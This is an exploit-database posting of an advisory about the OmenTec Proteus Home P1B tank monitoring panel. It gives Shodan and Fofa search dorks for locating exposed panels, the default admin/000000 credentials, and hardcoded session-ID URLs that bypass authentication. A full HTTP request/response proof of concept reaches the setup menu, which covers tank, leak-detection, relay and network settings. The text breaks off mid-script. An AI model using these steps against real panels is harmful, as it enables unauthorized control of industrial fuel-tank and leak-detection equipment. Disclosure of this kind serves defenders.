---
title: OmenTec Proteus Home P1B - Default Password and Broken Access Control
url: https://cxsecurity.com/issue/WLB-2024110024
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-11-18
fetch_date: 2025-10-06T19:12:24.917266
---

# OmenTec Proteus Home P1B - Default Password and Broken Access Control

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **OmenTec Proteus Home P1B - Default Password and Broken Access Control** **2024.11.17**  **![ir](https://cert.cx/cxstatic/images/flags/ir.png) [parsa rezaie khiabanloo](https://cxsecurity.com/author/parsa%2Brezaie%2Bkhiabanloo/1/) **(IR)** ![ir](https://cert.cx/cxstatic/images/flags/ir.png)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: OmenTec Proteus Home P1B - Default Password and Broken Access Control
# Date: 11/15/2024
# Exploit Author: parsa rezaie khiabanloo
# Vendor Homepage: omntec (https://www.omntec.com/)
# Version: Proteus Home P1B
# Tested on: Linux/Android(termux)/Windows/Mac
Step 1 : Attacker can using these dorks then can find the Tank panels .
Shodan : http.html\_hash:973195286
Fofa : "Proteus Home P1B" && port="10001"
Step 2 : Most panels username are admin and the password is 000000 .
Step 3 : Attacker can use these parameters and add them at the end of the IP then the popup will show .
After send this request attacker will see the alert like this Your session has expired.
Then Attacker must use Esc button to stop page refreshing immediately then can access to the all settings buttons .
/setup.ssi?SID=971591741
Example : http://IP:10001/setup.ssi?SID=971591741
OR
/setup.ssi?SID=2638966490
Example : http://IP:10001/setup.ssi?SID=2638966490
#POC
Request :
GET /setup.ssi?SID=971591741 HTTP/1.1
Host: IP:10001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://IP:10001/login.ssi
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
Response :
HTTP/1.0 200 OK
Server: lwIP/1.3.2
Content-type: text/html
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Expires: 0
<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="cache-control" content="no-cache" />
<title>Setup P1B</title>
<style>
body {
color:white;
background:#151515;
}
table {
font-family: arial, sans-serif;
border-collapse: collapse;
width: 80%;
}
table.center {
margin-left:auto;
margin-right:auto;
}
td {
border: 30px solid #151515;
text-align: center;
padding: 6px;
width: 10%;
}
tr.yellow { background-color: #fcfcb4; }
tr.blue { background-color: #bcecf4; }
tr.red { background-color: #fc8484; }
tr.green { background-color: #b9f1b6; }
tr.white { background-color: white; }
#SID, #VOL, #HGT, #TMP { display:none; }
#header {
font-family:Neuropol,Arial,Helvetica,sans-serif;
text-align:center;
font-size:30px;
color:#66B2FF;
}
a {
text-align:center;
font-size:20px;
color:black;
text-decoration:none;
}
</style>
</head>
<body>
<div id="header"><br><h2>SETUP MENU</h2></div>
<b id="SID"><!--#SESSION-->0</b>
<b id="VOL"><!--#VOL\_UNIT-->0</b>
<b id="HGT"><!--#LEN\_UNIT-->0</b>
<b id="TMP"><!--#TMP\_UNIT-->0</b>
<table class="center">
<tr class="yellow">
<td><a id="P0" href="param.htm" onclick='addUrl("0")'>SYSTEM<br>UNITS</a></td>
<td><a id="P1" href="param.htm" onclick='addUrl("1")'>PRINTER<br>SETTINGS</a></td>
<td><a id="P2" href="param.htm" onclick='addUrl("2")'>SHIFTS TIME<br>SETTINGS</a></td>
<td><a id="P3" href="param.htm" onclick='addUrl("3")'>MISC.<br>SETTINGS</a></td>
</tr>
<tr class="blue">
<td><a id="P4" href="select.htm" onclick='addUrl("4")'>TANK<br>SETTINGS</a></td>
<td></td>
<td><a id="P6" href="select.htm" onclick='addUrl("6")'>TANK TABLE<br>(STRAPPING)</a></td>
<td><a id="P7" href="select.htm" onclick='addUrl("7")'>TANK<br>MISC.</a></td>
</tr>
<tr class="blue">
<td></td>
<td></td>
<td><a id="P10" href="select.htm" onclick='addUrl("10")'>BX-SENSOR<br>SETTINGS</a></td>
<td><a id="P11" href="command.htm" onclick='addUrl("11")'>COPY TANK<br>SETTINGS</a></td>
</tr>
<tr class="red">
<td><a id="P12" href="param.htm" onclick='addUrl("12")'>COMM PORTS</a></td>
<td><a id="P13" href="param.htm" onclick='addUrl("13")'>MODBUS</a></td>
<td><a id="P14" href="param.htm" onclick='addUrl("14")'>NETWORK<br>SETTINGS</a></td>
<td></td>
</tr>
<tr class="yellow">
<td></td>
<td><a id="P17" href="command.htm" onclick='addUrl("17")'>CLEAR LOGS</a></td>
<td><a id="P18" href="command.htm" onclick='addUrl("18")'>SYSTEM<br>BACKUP</a></td>
<td><a id="P19" href="command.htm" onclick='addUrl("19")'>SYSTEM<br>RESTORE</a></td>
</tr>
<tr class="green">
<td><a id="P20" href="param.htm" onclick='addUrl("20")'>VLD-LEAK<br>SETTINGS</a></td>
<td><a id="P21" href="select.htm" onclick='addUrl("21")'>VLD-LEAK<br>TANK SETTINGS</a></td>
<td><a id="P22" href="param.htm" onclick='addUrl("22")'>CITLD-LEAK<br>SETTINGS</a></td>
<td></td>
</tr>
<tr class="white">
<td><a id="P24" href="command.htm" onclick='addUrl("24")'>PRINT SYSTEM<br>SETTINGS</a></td>
<td><a id="P25" href="pgrelays.htm">RELAY<br>SETTINGS</a></td>
<td><a id="P26" href="events.htm">EVENTS</a></td>
<td><a id="P27" href="pginputs.htm">INPUT<br>SETTINGS</a></td>
</tr>
<tr class="red">
<td><a id="P28" href="param.htm" onclick='addUrl("28")'>EMAIL<br>ACCOUNT</a></td>
<td><a id="P29" href="param.htm" onclick='addUrl("29")'>EMAIL<br>CONTACTS</a></td>
<td><a id="P30" href="command.htm" onclick='addUrl("30")'>SYNCRONIZE<br>SYSTEM TIME</a></td>
<td><a id="P31" href="command.htm" onclick='addUrl("31")'>UPDATE<br>EXIT</a></td>
</tr>
</table>
<script type="text/javascript" src="./js/comlib.js"></script>
<script>
function addUrl(cmd) {
var tag = document.getElementById('P' + cmd);
tag.href += '?';
tag.href = tag.href.substring(0, tag.href.indexOf('?')) + '?P=' + cmd + '&T=' + tag.innerHTML.replace("<br>", " ");
tag.href += '&U=' + units;
}
var parameters = location.search.substring(1).split("&");
var sid\_par = parameters[0].split("=")[1];
var sid\_ssi = document.getElementById('SID').innerHTML.split(">")[1];
var units;
units = document.getElementById('VOL').innerHTML.split(">")[1] + ';';
units += document.getElementById('HGT').innerHTML.split(">")[1] + ';';
units += document.getElementById('TMP').innerHTML.split(">")[1];
if( sid\_par != sid...